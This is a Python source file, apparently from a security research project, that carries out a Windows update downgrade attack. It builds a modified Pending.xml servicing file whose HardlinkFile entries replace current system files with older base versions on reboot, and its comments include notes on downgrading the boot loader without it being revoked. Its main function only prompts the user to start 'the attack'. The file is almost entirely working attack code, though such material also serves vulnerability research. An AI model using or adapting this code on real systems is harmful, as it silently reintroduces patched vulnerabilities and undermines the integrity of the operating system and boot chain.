import os

from utils.component_store import create_base_update_files
from utils.filesystem import create_dir, is_file_contents_equal, is_path_exists, Path
from utils.xml import load_xml, find_child_elements_by_match, create_element, append_child_element

"""
Potential issues:
Some file elements do not contain destinationPath, usually .NET stuff
If downgrading boot loader, change it in the EFI system partition 
Also make sure that the downgraded boot loader is not revoked
"""


def downgrade_to_base():
    base_dir_path = Path("C:\\Users\\Alon\\Desktop\\BYOVW\\Update")
    # base_dir_path = Path("C:\\Users\\User\\Desktop\\Repos\\BYOVW\\Update")

    print("[INFO] Creating update directory")
    create_dir(base_dir_path.full_path, exist_ok=True)

    print("[INFO] Creating update files")
    update_files = create_base_update_files(base_dir_path.full_path)

    print("[INFO] Loading downgrade xml")
    downgrade_root = load_xml("resources\\Pending.xml")
    poq_elements = find_child_elements_by_match(downgrade_root, "./POQ")
    poq_post_reboot_element = poq_elements[0]

    print("[INFO] Inserting update files to downgrade xml")
    skipped_paths = set()
    for update_file in update_files:
        source = update_file["source"]
        update_file["source"] = os.path.normpath(fr"\??\{source}")
        destination = update_file["destination"]
        destination_dir = os.path.dirname(destination)

        # If destination exists, compare it with source
        if is_path_exists(destination):
            if is_file_contents_equal(source, destination):
                continue  # Avoid updating files that are "down to date"

        # If update file does not exist, and its directory tree also does not exist, create it
        else:
            try:
                os.makedirs(destination_dir[4:], exist_ok=True)
            except PermissionError:
                skipped_paths.add(destination_dir)
                continue

        hardlink_element = create_element("HardlinkFile", update_file)
        append_child_element(poq_post_reboot_element, hardlink_element)

    print("[INFO] Writing modified downgrade xml to disk")
    downgrade_root.write("Downgrade.xml")

    print("[INFO] Restart your computer to be down to date!")

    print(f"[WARNING] Skipped paths: {skipped_paths}")


def main():
    input("Press any key to start the attack")


if __name__ == '__main__':
    main()
